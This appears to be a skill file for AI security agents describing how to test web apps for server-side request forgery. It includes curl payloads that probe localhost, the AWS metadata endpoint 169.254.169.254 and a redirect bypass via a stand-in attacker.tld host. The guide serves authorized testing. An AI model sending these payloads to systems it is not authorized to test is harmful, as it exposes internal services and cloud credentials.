---
id: ssrf
name: Server-Side Request Forgery Testing
version: 1.0.0
domain: security
tags: [security, ssrf, cloud, metadata, outbound-requests]
tools_required: [curl, agent-browser]
agent_scope: [specialist/security, specialist/cloud-security]
confidence: high
source: internal
created_at: 2026-03-09
---

## Overview

Test server-side URL fetchers and webhook/import features for SSRF. Focus on internal network access and cloud metadata exposure.

## Detection Logic

1. Identify URL-consuming features (`url`, `callback`, `webhook`, `import`).
2. Probe localhost, RFC1918 ranges, and metadata endpoints.
3. Check redirect handling and protocol handling (`http`, `gopher`, `file`).

## Testing Playbook (curl + browser)

### curl
```bash
# Localhost probing
curl -i -X POST https://target.tld/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:80/"}'

# Cloud metadata probe (AWS)
curl -i -X POST https://target.tld/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Redirect-based bypass candidate
curl -i -X POST https://target.tld/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"https://attacker.tld/redirect-to-internal"}'
```

### Browser / agent-browser
1. Test avatar import, URL preview, webhook setup, document fetch flows.
2. Use DevTools to replay JSON payloads with internal targets.
3. Verify response content and timing differences for internal hosts.

## Verification Criteria

- Vulnerable if server can access internal services or metadata endpoints via user input.
- Not vulnerable if strict URL allowlisting and network egress controls block internal targets.

## Evidence Checklist

- Capture exact request and response evidence.
- Capture reproducible steps and required prerequisites.
- Capture affected roles, objects, and business impact.


## References

- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server_Side_Request_Forgery
- https://owasp.org/www-project-cheat-sheets/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

